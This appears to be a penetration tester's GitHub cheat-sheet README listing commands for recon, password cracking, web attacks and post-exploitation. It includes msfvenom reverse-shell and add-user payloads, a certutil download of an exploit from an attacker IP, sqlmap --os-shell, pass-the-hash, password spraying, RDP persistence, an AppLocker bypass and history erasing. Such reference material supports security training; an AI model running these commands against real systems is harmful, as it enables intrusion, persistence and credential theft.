# Welcome to the Command-Center!

## There are so many tools, commands and switches... it's easy to confuse them! I made this repo so you can quickly search for the right ones when needed.

Let's exit the outside world and enter cyber space. (We have cookies... 😎)

![metal_door](images/001_metal-door.jpg)

Use your browser's search function to quickly find commands for a tool you need. In Firefox for example this is done by using `CTRL+F`

Alternatively you can just browse through these commands using your browser's slider or your mouse wheel. Anyways, I hope this repo can serve you well, let me know if you have any comments or suggestions, you can reach me here or on **[LinkedIn](https://www.linkedin.com/in/codetorok/)**. Thanks for checking out the Command-Center!

* Go here if you are looking for:
* **[TOR Service / Anonymity](https://github.com/codetorok/command-center/blob/master/TOR-SERVICE/tor_service_setup_and_use.md)**
* **[Linux Privilege Escalation (privesc)](https://github.com/codetorok/command-center/blob/master/Linux-Privesc/linux-privesc.md)**
* **[Windows Privilege Escalation (privesc)](https://github.com/codetorok/command-center/blob/master/Windows-Privesc/windows-privesc.md)**
* **[Windows Active Directory](https://github.com/codetorok/command-center/blob/master/Windows_AD/windows-active-directory.md)**
* **[Windows SSH Service Setup](https://github.com/codetorok/command-center/blob/master/Windows-ssh/windows-ssh-setup.md)**
* **[Pivoting in Metasploit](https://github.com/codetorok/command-center/blob/master/pivoting_metasploit/pivoting_metasploit.md)**
* **[Buffer Overflow (Basic)](https://github.com/codetorok/command-center/blob/master/buffer_overflow/buffer_overflow.md)**

![available_commands](images/003_available_commands.png)

## Amass
Really good if you need to enumerate subdomains, just make sure you start it at night before going to bed :)

* `amass -ip -d <domain.com>`

* If you don't have ***amass*** installed on your system:
  * `apt install snapd`
  * `service snapd start`
  * `snap install amass`
  * `snap run amass`

## Binwalk 
Extracts files hidden in pictures, pretty good for stegonograpy.

* `binwalk somepicture.jpg -e`

## public IP from terminal

* `dig +short myip.opendns.com @resolver1.opendns.com`

* `curl ifconfig.me` an even shorter command which I really love :)

## curl
You can do some great things with **_curl_**, it's worth going through it's man page, this is one of the great techniques I use quite often:

* `curl -s <domain or IP> | grep "<form"` to discover which HTTP methods are available. `-s` is for _silent_ mode.

* `curl -X DELETE <http://IP:PORT>` if you get a 200 OK that means that method is supported, you can try all the others as well like PUT, etc..

Directory discovery with **_dirb_** when username and password is known:
* `dirb <http://IP or domain/> -u <username>:<password>`

Directory busting with **_dirsearch_** is another great option:
* `dirsearch.py -u <http://IP or domain> -e php, html -x 400, 401, 403` the `-x` is to exclude those type of error response codes.

## Docker & Juice Shop
This is how you install **_Docker_** on Kali for whatever you need, I run my Juice Shop app to test for the OWASP Top10 on Docker:

1. `curl -fsSL https://download.docker.com/linux/debian/gpg | gpg --dearmor | sudo tee /usr/share/keyrings/docker-archive-keyring.gpg > /dev/null`
2. `echo 'deb [arch-amd64 signed-by-/usr/share/keyrings/docker-archive-keyring.gpg] https://download.docker.com/linux/debian buster stable' | sudo tee /etc/apt/sources.list.d/docker.list`
3. `apt update`
4. `apt install docker-ce` 
5. `docker --version`

To install **_Juice Shop_**

1. `docker pull bkimminich/juice-shop`
2. `docker run --rm -p 3000:3000 bkimminich/juice-shop`
3. browse to *_http://localhost:3000_* (on macOS and Win browse to *_http://192.168.99.100:3000_* if you are using docker-machine instead of the native docker installation)

Once you installed **_Juice Shop_** and want to run it on different ocasions there's this simple bash script to help you with. Just make a file with nano, name it as _run_juice_shop.sh_ or whatever you want to name it copy/paste the below code in it,save it and make it executable with `chmod +x run_juice_shop.sh`:
```
#!/bin/bash

sudo docker run --rm -p 3000:3000 bkimminich/juice-shop
```

## grep
So let's say you have to crack a password that's from a website that uses just a 4 characters long passphrase. To save up time you can just make a copy of your rockyou.txt or whatever monstrous passlist your using and then filter the copy into a new file that has only the 4 characters long entries (hence this **_grep_** one liner) from your rockyou-copy.txt. Copy is needed to not to mess up the original one, you can never be cautious enough ;)

* `grep -E '^.{4}$' rockyou-copy.txt > only4words.txt`

## SUID
**_Set-user Identification_** are files with special root priv permissions. It happens when root doesn't want to make a user root user just in certain cases when user runs some files that requires sudo permissions. Finding these files are imporant as SUID can be abused. SUID starts with a 4 and SGID -which is similar to SUID starts with a 2. The only difference between the two is that when a script or command with SGID (Set-group Identification) permission runs, it runs as if it were a member of the same group in which the file is a member.

If a lowercase letter “l” appears in the group’s execute field, means that the setgid bit is on, and the execute bit for the group is off or denied.

* `find / -perm +6000 2>/dev/null | grep '/bin/'` only use grep if you need it or looking for a very specific location

## fping
Helps you to ping a range of IP addresses.

* `fping -a -g 192.168.0.10 192.168.0.255` the `-a` is for all hosts alive and the `-g` is for the range of IP addresses.

## dir (Win)
Searching in **_Windows_** using the `dir` command we have the following switches available: (credit: find the original post by __computerhope.com__ [here](https://www.computerhope.com/dirhlp.htm)) 

* `dir *.txt *.doc` to list any file whose name has the file extension _.txt_ or _.doc_
* `dir /a:d` to list only directories
* `dir /a:r` to list only files with the read-only attribute
* `dir /s` to list files and directories in the directory, and in any subdirectories. For instance, if your current directory is the root directory "C:\>," this command lists every file and directory on the C: drive
* `dir /p` to pause after each screenful of output. Use this option if the information is scrolling past the screen before you can read it. You are prompted to press any key before listing continues past the current screen
* `dir /w` to list multiple file names on every line, producing "wide" output, which displays more file names at once. However, other information such as file size is omitted
* `dir /s /w /p` to recursively lists all files and directories in the current directory and any subdirectories, in wide format, pausing after each screen of outputecursively lists all files and directories in the current directory and any subdirectories, in wide format, pausing after each screen of output
* `dir /s /w /p "C:\Program Files"` same as the above command, but lists everything in __C:\Program Files__, instead of the current directory. Because the directory name contains a space, it is enclosed in double-quotes, to prevent it from being interpreted is as two separate options
* `dir /s /q /a:sh /p C:\Windows` Lists any files and directories in __C:\Windows__, and any of its subdirectories `/s`, which have both the "hidden" and "system" file attributes `/a:sh`. Also, lists the owner of the file `/q`, and pauses after each screen of output `/p`
* `dir \ /s | find "i" | more` the above command uses vertical bars to pipe the output from dir to the command find, and then to the command more. The result is a list of all files and directories in the root directory of the current drive (\), with extra information. Namely, find also displays the number of files in each directory, and the amount of space occupied by each
* `dir /s /a:hs /q C:\Windows > myfile.txt` runs the _dir_ command, but redirects the output to the file __myfile.txt__, instead of displaying it on the screen. To view the contents of the file, you can use the `type` command and your file name, if the file is very long try it with `type myfile.txt | more`

## zsh
**_Erase history_** when using **_zsh_** for example from bash, create a function and then call it:

1. `function erase_history { local HISTSIZE=0; }`
2. `erase_history`

## Persistence via RDP
(credit: [Joe Helle aka The Mayor, MPP course](https://academy.tcm-sec.com/p/movement-pivoting-and-persistence-for-pentesters-and-ethical-hackers))

1. `powershell reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f; Enable-NetFirewallRule -DisplayGroup "Remote Desktop"` enabling Remote Desktop via powershell
2. `xfreerdp /u:<username> /p:'<password>' /v:<target IP>` now we can connect to it from kali
3. To disable it: `powershell reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 1 /f; Disable-NetFirewallRule -DisplayGroup "Remote Desktop"`

## gobuster
There are different ways you can use **_gobuster_** this is the one I use most of the times. The `-u` is for the host name `-w` is for the wordlist and `-t 40` is for the threads so it won't take forever. The `tee gobuster-initial` is so I can redirect the output to this file and can analyze it later if needed.

* `gobuster dir -u http://<IP or domain> -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 40 | tee gobuster-initial`

* with the same way but using the `vhost` option one can enumerate subdomains as well just changed the `dir` to `vhost` in the above command and maybe use a different wordlist for that purpose

# gpg
(The ***SHORT ID*** on the key is the last 8 digits of the fingerprint, the ***LONG ID*** is the last 16 digits.)
* `gpg --full-generate-key` to generate a key pair
* `gpg --output ~/revocation.crt --gen-revoke our_email_address` to generate a revocation certificate in case your private key gets compromised
* `chmod 600 ~/revocation.crt` to remove all permissions from this certificate
* `gpg --import <someones.key>` importing someone else's public key
* `gpg --fingerprint someone@email.com` checking someone elses public key's fingerprint for validation
* `gpg --sign-key someone@email.com` sing someone's public key for trust
* `gpg --output ~/dave-geek.key --armor --export ouremail@email.com` sharing our public key
* `gpg --send-keys --keyserver pgp.mit.edu <fingerprint>` sending our public key to a keyserver
* `gpg --encrypt --sign --armor -r ouremail@email.com <file_to_encrypt>` encrypting a file
* `gpg --decrypt encrypted.asc > plain.txt` decrypting a recieved encrypted file
* `gpg --keyserver pgp.mit.edu --refresh-keys` to refresh our public keys against the key server
* `gpg --keyserver pgp.mit.edu --send-keys <key ID>` sending the revocation of the key to the key server
* `gpg --keyserver pgp.mit.edu --search-keys <ID or email address for the key your searching for>` searching for public keys on ***pgp.mit.edu***
* `gpg --search-keys <ID or email address for the key your searching for>` searching for public keys on ***https://keys.openpgp.org:443***

### Addtitionally we can:

****
* `gpg --list-keys` then `gpg --edit-key <user ID>` in the gpg prompt select the key with the right ID `key 1` follow the instructions to change the expiration date of your key, use `help` for further assitance
* `gpg --list-keys` to list available keys
* `gpg --import <key_name>.asc` to import a key
* `gpg -o message.sig -s <message_file>` to sign a "message file"
* `gpg --verify message.sig` to verify the signature
* `gpg -o message.asc --clearsing message` to sign a file with a clear-text signature
* `gpg --delete-key "User name"` to delete a public key
* `gpg --delete-secret-key "User name"` to delete a secret key
* `gpg -o secret.gpg -c somefile` to encrypt a file that no one else has to decrypt use gpg to perform symmetric encryption
* `gpg -o myfile --decrypt secret.gpg` to decrypt a file encrypted with a symmmetric key
* `gpg --import <backupkeys.pgp>` import the backup keys
* `gpg --import <revocation file, ex revoke.asc>` imorting the revocation certificate

# sed

* `sed -i 's/text_to_replace/new_text/g' <file name>` without the `g` parameter at the end sed will only replace the first instance on each line only and without the `-i` switch sed will no overwrite the file we are working with, if we want to save the results as a new file we can just redirect the output to a new file like so: `sed -i 's/test_to_replace/new_text/g' <original file> > <new file>`
* `sed -n 's/text_to_replace/new_text/pg'` sed `-n` means no output unless there is a match because of the `p` parameter
### sed is very usefull when comnining it with grep IMO

## hashcat
Basic synthax. Again this is not a tutorial page, just a quick look up on the different and mostly used switches until you learn it by muscle memory. The _mode number_ can be found **[here](https://hashcat.net/wiki/doku.php?id=example_hashes)**
* `hashcat --force -m <mode number> -a 0 crackthis.txt /usr/share/wordlist/rockyou.txt`
* to find the _hashcat potfile_: `cat ~/.hashcat/hashcat.potfile`

## hydra
I mainly created this part because of the web login attack part. Sometimes it's hard to remember the sythax.

* `hydra -l <user name> -P <full path to the password list> ssh://<IP>` using Hydra against ssh
* `hydra -l <username> -P <full path to the password list> ftp://<IP>` using Hydra against
* `hydra -L <username list> -p <password> <IP> http-post-form "/wp-login.php:log=^USER^&pwd=^PWD^:Invalid username" -t 30` you can capture the error message (Invalid username) by trying a credential on the target website and replace the one I have in this synthax if needed. This example tests several usernames for the same password, a technique also called password spraying.

## John
Cracking some SHA256 hashes with john, using the rockyou.txt as a wordlist, redirecting the output  into athe johncracked.txt

* `john <hashes.txt> --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-SHA256 > johncracked.txt`

### gpg2john
Passing a private key to **_gpg2john_** to prep it and then passing the output file to john to crack it :) once it's done you can use the crack password and the private key to try to log in to the target system via ssh with `ssh -i id_rsa <username>@<IP>`

* `gpg2john id_rsa > id_rsa_prepped_for_john.hash` prepping the private key for a format understandable by john
* `john --wordlist=rockyou.txt --format=gpg id_rsa_prepped_for_john.hash`

### zip2john
Prepping a zip file for using it with _john_.

* `zip2john <zipfile name> > <output file name>`

With the same fashion there's **_pdf2john_** as well with a very similar synthax.

## playing with encoding and hashes
If you are interested in more depth on this matter check out the cyberchef's website.

* `echo -n 'hashes are cool | md5sum`
* `echo -n 'hashes are cool' | base64` encoding with base64
* `echo -n 'aGFzaGVzIGFyZSBjb29s' | base64 -d` decoding with base64
* `echo -n 'hashes are cool' | rot13` encoding and decoding is the same synthax

## msfvenom

* *_Windows add user:_* `msfvenom -p windows/adduser USER=hacker PASS=Password123! -f exe -o hackware.exe`

* *_rev shell:_* `msfvenom -p windows/shell_reverse_tcp lhost=<local host IP> lport=<local host listening port> -f raw > exploit.php`

## sql / mysql
There are many more thing that can be done by using sql, for example if there is an option for that you can list the data of all employees and if it's defined in the database who's admin or not when logged in and you can write to this database you can create a new employee with admin rights then use those credentials to log into the system. I left this section here for the newcomers, maybe I'll add to it later on.

* how to connect to it: `mysql -u <username> -p -h <IP>`
* to view the tables: `source example.sql`
* to select a database: `USE <db name>;`
* displaying the tables: `SHOW TABLES;`
* display everything from the employees database: `SELECT * FROM employees;`

## nmap
You can always look up for an nmap script which is usually stored in `ls /usr/share/nmap/scripts/` and can use them with the `--script <script name>`. For example to check for the infamous *_eternal blue_* exploit you would use `nmap -p 445 --script smb-vuln-ms17-010.nse <target>`.

* `nmap -sn <192.168.0.1/24>` or `nmap -sn 192.168.0.1-15` or `nmap -sn 192.168.0.*` or `nmap -sn 192.168.0.12*` are different ways for checking a range of IPs. The `-sn` is for the ping scan to discover live hosts on the network. Very useful if on a black box assessment.
* `nmap -sn -iL hostlist.txt` if you want to use a file containing the list of IPs you want to check.
* if you already know the hosts are alive you can use the `-Pn` option to skip the ping scan and maybe just try to fingerprint the OS: `nmap -Pn -O 192.168.0.1`
* if you have to scan hundreds of hosts we should at first limit OS recon to just the promising ones: `nmap -O --osscan-limit 192.168.1-125`
* to check if smb singing is disabled on any of the /24 subnet we can use `nmap --script smb2-security-mode.nse -p 445 192.168.0.0/24` finding the script on the same location I showed you at the beginning of this section.
* Checking if nmap can find any known vulnerability against the smb service: `nmap --script smb2-security-mode.nse -p 445 192.168.0.0/24`

## A real life scenario using nmap
If you're dropped in an enviroment without anything, check your IP address on the network, then run these scans to identify other machines, their purpose and services, version numbers, open ports etc with nmap.

1. `nmap -sn 172.16.37.0/24 -oA initial_discovery.nmap` to check for live hosts on the network and save the output in all formats into the _initial_discovery.nmap_ file.
2. `cat initial_discovery.nmap | grep for | grep -v "\.234" | cut -d " " -f 5 > ips.txt` we need to exclude our own IP which ends with _.234_ hence we need the `-v` switch with grep, and `cut -d " " -f 5` will cut the spaces and keeps the 5th field which is the IP address from `Nmap scan report for <IP>`
3. Finally `sudo nmap -sV -n -O -p- -Pn -T4 -iL ips.txt -A --open -oA final_discovery.nmap` which is `-sV` to get the service version number, `-n` disabling reverse DNS lookup, `-O` is for OS fingerprinting, `-p-` scanning all ports, `-Pn` skip the ping scan, treat all hosts as live, `-T4` is for performance, `-iL` to use the IPs from the ips.txt file and `-A --open` to get all information on the open ports, `-oA` to save the output in a file.

One more thing: if you need to generate a nice html report from the output you can use *_xsltproc_*:

* `sudo xsltproc final_discovery.nmap -o nmap_DATE_TARGET.html`

## Impacket

### psexec
* `psexec.py <username>:'<password>'@<IP>`

### pass the hash
* pass the hash, Win: `pth-winexe -U Administrator%'<admin hash>' //<target IP> cmd.exe`

## Python3
### One liners and quick scriptsb 
(Later on this section will be moved just like AD and the others at the beginning of this repo. This is just to simplify and better organize this space.)

* to spawn a shell: `python3 -c 'import pty;pty.spawn("/bin/bash")'`
* webservers: `python3 -m http.server 8080`
* if webserver is picked up by the firewall use ftp server: `python3 -m pyftpdlib -p 21 --write` and if you don't have it get it first with: `pip3 install pyftpdlib` and to log in just use the IP address of your ftp server: `ftp <ftp server IP>`

#### QRCode generator (Python3)

```
import qrcode

input_data = "https://google.com"
qr = qrcode.QRCode(version=1, box_size=10, border=5)
qr.add_data(input_data)
qr.make(fit=True)
img = qr.make_image(fill='black', back_color='white')
img.save('qrcode001.png')
```

#### progress bar (Python3)

```
for i in range(0, 51):
    time.sleep(0.1)
    sys.stdout.write("{} [{}{}]\r".format(i, '#' * i, "." * (50 - i)))
    sys.stdout.flush()
sys.stdout.write("\n")

```

#### printing and checking a usage form and switches (Python3)

```
if len(sys.argv) == 1:
    print("USAGE: python3 the_sys_module.py <code name>")
    print("No arguments, exiting...")
    sys.exit(9)
if sys.argv[1] == "tellmemore":
    print("Code name accepted..., exiting with exit code 0.")
else:
    print("Wrong code name, exiting with exit code 3.")
```

## smbclient
Just a couple of things here.

* `smbclient -L //IP` to list the available shares
* once connected you can use the `prompt` command for smbclient to not to ask you for a prompt every time you want to download something
* `recursive` is used to be able to download something recursively from a folder 

## sqlmap
One of my favorite tecniques I learned from [ippsec](https://ippsec.rocks/?#) is to capture a login request with Burp and save it in a file like login.req, then in sqlmap I can just use `sqlmap -r login.req --level 5 --risk 3` to try to find a vuln.

* `sqlmap -u http://sqli.site/view.php -D <db_name> -T <table_name ex: users> -C <username.password> --dump`
* `sqlmap -u http://sqli.view.php -D <db_name> -T <table_name> --dump-all`
* `sqlmap -u http://sqli.view.php?id=1 --users`
* `sqlmap -u http://sqli.view.php?id=1 --tor --tor-type=SOCKS5`
* `sqlmap -u http://sqli.view.php?id=1 --dbs`
* `sqlmap -u http://sqli.view.php -D <db_name> --tables`

Using the session cookies and sqlmap: `sqlmap -u 'http://10.129.95.174/dashboard.php?search=any+query' -- cookie="PHPSESSID=7u6p9qbhb44c5c1rsefp4ro8u1"`

If the target is vulnerable for the get request (see above) we can get a shell out of it: `sqlmap -u 'http://10.129.95.174/dashboard.php?search=any+query' -- cookie="PHPSESSID=7u6p9qbhb44c5c1rsefp4ro8u1" --os-shell`

## ssh

*_This section is under development_*

## steghide
Added for fun :) extract a file form a picture.

* `steghide extract -sf <picutre.jpg>`

## sublist3r
A great tool for subdomain enumeration.

* `sublist3r -d <website.com> -t 50`
* it has a built in brute force modul: `sublist3r -d <domain> -b` which will use a built in list that can be found here: `/usr/share/sublist3r/subrute/names.txt`

## tar
No big deal here, just had to remember the how to extract a .tar.gz package so I saved it here for reference.

* `tar -xvf <somefile.tar.gz>`

## quickly append IP to your /etc/hosts file

* `sudo echo '<192.168.0.23> <retrowerb.htb>' | tee -a /etc/hosts`

## theharwester
For subdomain enumeration.

`theharvester -d <domain.com> -l 500 -b google` where `-l` is to for how deep to go and `-b` is for the search engine.

## to upgrade a shell on the target machine
Some shells are fuzzy but after an upgrade you can have a proper one with all the normal shell functions like TAB, etc...

1. `python3 -c 'import pty;pty.spawn("/bin/bash")'`
2. `export TERM=xterm
3. here you want to press `CTRL+z` to background your session
4. `stty raw -echo; fg` I like to add `fg` here to bring the session to the foreground again and don't have to do it as a next command

## virtualbox
Need this config to be able to make virtualbox work with both bridged and NAT at the same time.

* `sudo nano /etc/network/interfaces`
* edit the file: `allow-hotplug eth1` uncomment it
* edit the file: `iface eth1 inet dhcp` uncomment it
* save the changes, exit nano then: `sudo ifup eth1` to apply the changes on the running system.

## wfuzz
Enlists subdomains based on a wodlist, here using top5000.txt from seclist. `--hw 290` is needed so 404 pages won't show up in the search results.

* `wfuzz -c -f sub-fighter -w top5000.txt -u http://<domain> -H "HOST: Fuzz.domain.com" --hw 290`

## bypass AppLocker in Windows
There are many ways to bypass AppLocker rules, if it's configured with the default rules, we can bypass it just by placing our executable into this directory which is whitelisted by default:

* `c:\Windows\System32\spool\drivers\color`

## Windows file transfer
In case you have to bring a file over to the compromised Win machine. The last piece of information is how do you want to name the file you bring over.

* `certutil -urlcache -f http://10.10.14.5/MS10-059.exe ms.exe`

## Windows commands history check
It's just like bash history in Linux.

* `c:\Users\<username>\%userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt` this line opens up a notepad with the histroy of commands.

## wpscan
The best scanner for Wordpress sites.

* `wpscan --url http://<domain.com> -e u` to enumerate users
* once we found some users we save their names in a file called *_users.txt_*
* then we use a wordlist to find vulnerable passwords on found users: `wpscan -U /dev/shm/users.txt -P /usr/share/wordlist/fasttrack.txt --url http://<domain.com>`

## xfreerdp to RDP in onto a host

* `xfreerdp /u:administrator /p:letmein123! /v:<IP> /size:90&`

****
### This is the end of the list, remember, it's not the commands, it's what you do with those commands and how do you use the information you get out of theses swites, that's all that matters. This repo is for educational purposes only, anything you do with this is on you, so be responsable.

## The world is at your fingertips 💯
![world100](images/004_hacker_hoodie.jpg)
